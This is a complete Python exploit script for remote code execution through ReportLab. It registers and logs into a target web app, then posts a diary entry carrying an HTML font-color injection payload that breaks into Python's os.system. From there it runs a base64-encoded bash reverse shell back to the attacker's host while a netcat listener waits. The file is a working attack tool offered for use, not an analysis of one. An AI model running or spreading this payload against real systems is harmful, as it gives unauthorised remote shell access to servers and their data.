import os,time,threading,requests,argparse
from base64 import b64encode

class RCE:
    def __init__(self, url, username, password, lhost, lport):
        self.username , self.password = username,password
        self.url , self.lhost,self.lport = url,lhost,lport
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        })
    # registers an account    
    def register(self):
        data = {'username':self.username,'password':self.password}
        response = self.session.post(self.url+'/register',data=data, allow_redirects=True)
        if response.status_code == 200:
            print(f"Registered User: {self.username}")
        else:
            print(f"Failed To Register User: {self.username}")
    
    #logs into the registered account
    def login(self):
        data = {'username':self.username,'password':self.password}
        response = self.session.post(self.url+'/login',data=data, allow_redirects=True)
        if response.status_code == 200:
            print(f"Logged In User: {self.username} | cookie: {self.session.cookies.get('session')}")
        else:
            print(f"Failed To Login User: {self.username}")
    
    #starts netcat to listen for incoming connections        
    def listener(self):
        print(f"[*] Starting Netcat listener on port {self.lport}")
        os.system(f"nc -lvnp {self.lport}")

    # da actual exploit which will be sent to the server    
    def exploit(self):
        print("[*] Crafting Payload")
        rev_shell = "echo "+b64encode(bytes(f"sh -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1","utf-8")).decode('utf-8') + "| base64 -d | bash"
        payload = """<font color="[ [ getattr(pow,Word('__globals__'))['os'].system('"""+rev_shell+"""') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">hecked</font>"""
        print(f"[!] Sending {payload}")
        data = {'diary_entry': payload}
        self.session.post(self.url+'/diary',data=data)
    
    # putting it all together
    def run(self):
        self.register()
        self.login()
        listener_thread = threading.Thread(target=self.listener)
        listener_thread.start()
        self.exploit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reportlab RCE Exploit Script | Script Author: @sudo.dwg")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("username", help="Username")
    parser.add_argument("password", help="Password")
    parser.add_argument("lhost", help="Local Host IP for revshell")
    parser.add_argument("lport", type=int, help="Local Port for revshell")
    
    args = parser.parse_args()
    
    client = RCE(args.url, args.username, args.password, args.lhost, args.lport)
    client.run()